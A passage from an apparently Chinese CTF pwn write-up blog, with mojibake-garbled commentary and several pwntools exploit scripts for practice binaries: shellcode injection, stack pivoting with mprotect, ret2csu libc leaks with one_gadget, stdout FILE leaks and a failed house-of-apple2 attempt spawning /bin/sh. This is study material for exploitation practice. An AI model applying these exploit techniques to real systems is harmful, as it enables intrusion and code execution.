class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#--------------------------</span><br>mmap=<span class="hljs-number">0x233000</span><br>shellcode=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rdi,0</span><br><span class="hljs-string">    mov rsi,0x23301e</span><br><span class="hljs-string">    mov rdx,0x800</span><br><span class="hljs-string">    mov rax,0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(shellcode)))<br>sea(<span class="hljs-string">&#x27;Show me your magic.\n&#x27;</span>,shellcode)<br><span class="hljs-comment">#debug()</span><br>sea(<span class="hljs-string">&#x27;Good luck!&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p64(<span class="hljs-number">0x233000</span>))<br>orw_payload=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>orw_payload+=shellcraft.read(<span class="hljs-number">3</span>,mmap+<span class="hljs-number">0x850</span>,<span class="hljs-number">0x50</span>)   <br>orw_payload+=shellcraft.write(<span class="hljs-number">1</span>,mmap+<span class="hljs-number">0x850</span>,<span class="hljs-number">0x50</span>)<br>se(asm(orw_payload))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ret2csu2">ret2csu2</h3><p>æ ˆè¿ç§»åˆ°bssæ®µ,ç„¶åmprotectææƒbssæ®µ,ç´§æ¥ç€æ‰§è¡Œshellcodeå³å¯</p><p>(mprotectçš„åœ°å€è¦0x1000çš„å€æ•°ï¼Œä¸ç„¶æ— æ³•ææƒï¼Œæ€»çš„æ¥è¯´è¿™é¢˜gdbè°ƒè¯•æ ¼å¤–é‡è¦)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select =<span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27162</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rdi,rsi,rdx,function</span>):<br>    csu_front_addr=<span class="hljs-number">0x400740</span><br>    csu_end_addr=<span class="hljs-number">0x40075A</span><br>    payload = <span class="hljs-string">b&#x27;&#x27;</span><br>    payload += p64(csu_end_addr) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(function) + p64(<br>        rdi) + p64(rsi) + p64(rdx)<br>    payload += p64(csu_front_addr)<br>    payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br>    <span class="hljs-keyword">return</span> payload<br><span class="hljs-comment">#-----------------</span><br>bss=<span class="hljs-number">0x601020</span>+<span class="hljs-number">0x300</span><br>main_read=<span class="hljs-number">0x4006D6</span><br>leave_ret=<span class="hljs-number">0x0000000000400681</span> <span class="hljs-comment"># leave ; ret</span><br>main=<span class="hljs-number">0x400683</span><br>shellcode=<span class="hljs-string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#x27;</span><br>mprotect=elf.got[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>payload=flat(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xf0</span>,bss+<span class="hljs-number">0xf0</span>,main_read)<br><span class="hljs-comment">#debug()</span><br>sea(<span class="hljs-string">&#x27;Also a fun function in this elf.Remember to check it!\n&#x27;</span>,payload)<br>payload1=csu(<span class="hljs-number">0x601000</span>,<span class="hljs-number">0x1000</span>,<span class="hljs-number">7</span>,mprotect)+p64(<span class="hljs-number">0x6013a0</span>)+shellcode<br>payload1=payload1.ljust(<span class="hljs-number">0xf0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload1+=p64(bss-<span class="hljs-number">8</span>)+p64(leave_ret)<br><span class="hljs-comment">#debug()</span><br>se(payload1)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="è¿™æ˜¯å †ğŸ">è¿™æ˜¯å †ğŸ</h3><p>è¿™é¢˜æœ‰éš¾åº¦çš„</p><p>è¿˜å¼€äº†æ²™ç›’ï¼Œç¦ç”¨äº†execveå’Œopen</p><p>æ¼æ´ä¾æ—§å­˜åœ¨äºEdit ä¸‹æ ‡å°äº0æ²¡æ£€æµ‹ï¼Œå¯ä»¥æ•°ç»„è¶Šç•Œæ‰“stdoutæ³„éœ²libc</p><p>å› ä¸ºæ‰“å°å‡ºæ¥çš„åœ°å€å¤ªå¤šï¼Œå˜æ•°å¤ªå¤šï¼Œ7få¼€å¤´çš„å¯èƒ½æ˜¯æ ˆåœ°å€ï¼Œlibcæ®µçš„åœ°å€ï¼Œå‡‘å·§7få­—ç¬¦ç­‰æƒ…å†µ</p><p>æ‰€ä»¥æˆ‘æ‰¾äº†å‡ ä¸ªå¯èƒ½æ˜¯libcæ®µçš„åœ°å€ï¼ŒåŠ å¤§æ¦‚ç‡ï¼Œå¦‚æœä¸æ˜¯è¿™äº›åœ°å€çš„è¯å°±ä¼šæŠ¥é”™libc_base undined</p><p>å¤šè¯•å‡ æ¬¡</p><p>æ‰¾ä¸åˆ°é¢˜è§£ï¼Œæç¤ºçš„åŠ«æŒputsä¸ä¼šï¼Œè‡ªå·±æœ‰å¦ä¸€ç§æ€è·¯ï¼š</p><p>æ•°ç»„è¶Šç•Œæ‰“stdoutæ³„éœ²libc</p><p>ç»§ç»­æ•°ç»„è¶Šç•Œæ‰“stderrï¼Œexitæ¥è§¦å‘IOæµï¼Œç”¨çš„æ˜¯house of apple2çš„åˆ©ç”¨é“¾</p><p>(ä¸è¿‡è¿™ä¸ªæ–¹æ³•ä¸å¤ªå¥½ï¼Œè¿˜å¾—å°å¿ƒç¿¼ç¿¼ä¸ç ´åstdoutï¼Œç ´åæ‰äº†è°ƒç”¨putså°±æŠ¥é”™)</p><p>exitå¹¶æ²¡æœ‰è°ƒç”¨æŒ‡å®šé“¾ï¼Œä¸çŸ¥ä¸ºå•¥</p><p>æœ€åè™½ç„¶å¤±è´¥äº†ï¼Œä½†è¿˜æ˜¯è®°å½•ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#fail exp</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">content</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Any data?\n&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&#x27;Content:&#x27;</span>,content)<br><span class="hljs-comment">#------------------------</span><br>edit(-<span class="hljs-number">8</span>,flat(<span class="hljs-number">0xfbad1800</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>rc(<span class="hljs-number">0x648</span>)<br>rc(<span class="hljs-number">0x1000</span>)<br>libc_addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-keyword">if</span> (libc_addr-<span class="hljs-number">0x1ed4a0</span>)&amp;<span class="hljs-number">0xfff</span>==<span class="hljs-number">0x000</span> :<br>    libc_base=libc_addr-<span class="hljs-number">0x1ed4a0</span> <span class="hljs-comment">#_nl_global_locale</span><br><span class="hljs-keyword">elif</span> (libc_addr-<span class="hljs-number">0x1ee7f0</span>)&amp;<span class="hljs-number">0xfff</span>==<span class="hljs-number">0x000</span> :<br>    libc_base=libc_addr-<span class="hljs-number">0x1ee7f0</span> <span class="hljs-comment">#_IO_stdfile_0_lock</span><br><span class="hljs-keyword">elif</span> (libc_addr-<span class="hljs-number">0x8ff50</span>)&amp;<span class="hljs-number">0xfff</span>==<span class="hljs-number">0x000</span> :<br>    libc_base=libc_addr-<span class="hljs-number">0x8ff50</span> <span class="hljs-comment">#_IO_new_file_finish</span><br>info(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br><br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>_IO_wfile_jumps = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>stderr=libc_base+libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stderr_&#x27;</span>]<br><span class="hljs-comment">#debug()</span><br><br>fake_IO_FILE =<span class="hljs-string">b&#x27;  sh&#x27;</span><br>fake_IO_FILE =fake_IO_FILE.ljust(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(<span class="hljs-number">1</span>)<br>fake_IO_FILE =fake_IO_FILE.ljust(<span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(stderr +<span class="hljs-number">0x50</span>+<span class="hljs-number">0xe0</span>)<br>fake_IO_FILE =fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(stderr + <span class="hljs-number">0x50</span>)<br>fake_IO_FILE =fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(_IO_wfile_jumps)<br>fake_IO_FILE +=p64(<span class="hljs-number">0xfbad1800</span>)+p64(stderr+<span class="hljs-number">0x163</span>)*<span class="hljs-number">5</span>+p64(stderr+<span class="hljs-number">0x164</span>)+p64(stderr+<span class="hljs-number">0x163</span>) +p64(stderr+<span class="hljs-number">0x164</span>)<br>fake_IO_FILE =fake_IO_FILE.ljust(<span class="hljs-number">0x50</span>+<span class="hljs-number">0xe0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(stderr +<span class="hljs-number">0x50</span>+<span class="hljs-number">0xe8</span>)<br>fake_IO_FILE +=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(stderr-<span class="hljs-number">0xc40</span>)+p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">0xffffffffffffffff</span>)+p64(<span class="hljs-number">0x0000000043000000</span>)+p64(stderr+<span class="hljs-number">0x1220</span>)+p64(<span class="hljs-number">0xffffffffffffffff</span>)+p64(<span class="hljs-number">0</span>)+p64(stderr-<span class="hljs-number">0xd40</span>)<br>fake_IO_FILE =fake_IO_FILE.ljust(<span class="hljs-number">0x50</span>+<span class="hljs-number">0xe0</span>+<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) +p64(system)<br>edit(-<span class="hljs-number">4</span>,fake_IO_FILE)<br><span class="hljs-comment">#debug()</span><br>sl(<span class="hljs-string">&#x27;0&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="WEEK5">WEEK5</h2><h3 id="overflow-me-plz">overflow me plz</h3><p>ä¾æ—§æ˜¯æ ˆè¿ç§»åˆ°bssæ®µï¼Œret2csuæ„é€ wirteæ¥æ³„éœ²libcï¼Œç„¶åone_gadget</p><p>(æœ¬æ¥æƒ³å†æ¬¡è¿ç§»ropæ¥åšçš„ï¼Œåˆ°æœ€åç¨‹åºä¹ŸæˆåŠŸæ‰§è¡Œäº†system(/bin/sh)äº†å°±æ˜¯æ²¡shellï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select =<span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29722</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rdi,rsi,rdx,function</span>):<br>    csu_front_addr=<span class="hljs-number">0x400740</span><br>    csu_end_addr=<span class="hljs-number">0x40075A</span><br>    payload = <span class="hljs-string">b&#x27;&#x27;</span><br>    payload += p64(csu_end_addr) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(function) + p64(<br>        rdi) + p64(rsi) + p64(rdx)<br>    payload += p64(csu_front_addr)<br>    payload += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x38</span><br>    <span class="hljs-keyword">return</span> payload<br><span class="hljs-comment">#-----------------</span><br>bss=<span class="hljs-number">0x601040</span>+<span class="hljs-number">0x200</span><br>leave_ret=<span class="hljs-number">0x00000000004006f7</span> <span class="hljs-comment"># leave ; ret</span><br>main_read=<span class="hljs-number">0x4006D9</span><br>main=<span class="hljs-number">0x400698</span><br>pd=flat(<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0xc0</span>,bss+<span class="hljs-number">0xc0</span>,main_read)<br>sea(<span class="hljs-string">&#x27;Show me if you can pwn it!\n&#x27;</span>,pd)<br><br>pd1=csu(<span class="hljs-number">1</span>,elf.got[<span class="hljs-string">&#x27;write&#x27;</span>],<span class="hljs-number">0x8</span>,elf.got[<span class="hljs-string">&#x27;write&#x27;</span>])+p64(main)<br>pd1=pd1.ljust(<span class="hljs-number">0xc0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pd1+=p64(bss-<span class="hljs-number">8</span>)+p64(leave_ret)<br><span class="hljs-comment">#debug()</span><br>se(pd1)<br>libc_base=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>info(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br><br>og=[<span class="hljs-number">0xe3afe</span>,<span class="hljs-number">0xe3b01</span>,<span class="hljs-number">0xe3b04</span>]<br>se(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xc8</span>+p64(libc_base+og[<span class="hljs-number">0</span>]))<br><br><span class="hljs-comment">#system=libc_base+libc.sym[&#x27;system&#x27;]</span><br><span class="hljs-comment">#pop_rdi=0x0000000000400763</span><br><span class="hljs-comment">#ret=0x40050e</span><br><span class="hljs-comment">#binsh=libc_base+0x1B45BD</span><br><span class="hljs-comment">#pd2=flat(&#x27;\x00&#x27;*0xc0,bss+0xc0,main_read)</span><br><span class="hljs-comment">#debug()</span><br><span class="hljs-comment">#sea(&#x27;Show me if you can pwn it!\n&#x27;,pd2)</span><br><span class="hljs-comment">#pop_rsi_r15=0x400761</span><br><span class="hljs-comment">#pd3=flat(ret,pop_rdi,binsh,system)</span><br><span class="hljs-comment">#pd3.ljust(0xc0,b&#x27;\x00&#x27;) </span><br><span class="hljs-comment">#pd3+=p64(bss-8)+p64(leave_ret)</span><br><span class="hljs-comment">#debug()</span><br><span class="hljs-comment">#se(pd3)</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="leak-me-plz">leak me plz</h3><p>ç¨‹åºåœ¨0x233000çš„åœ°å€è¯»å…¥äº†flag</p><p>å‘Šè¯‰äº†æˆ‘ä»¬libcåœ°å€ï¼Œè¿˜æœ‰ä»»æ„åœ°å€å†™0x38é•¿åº¦</p><p>æ‰“stdoutæ”¹p64(0xfbad1800)+p64(0)*3+p64(mmap)+p64(mmap+0x40)+p64(0)</p><p>é‡åˆ°putsä¼šæ‰“å°ä»mmapåˆ°mmap+0x40)çš„å€¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span 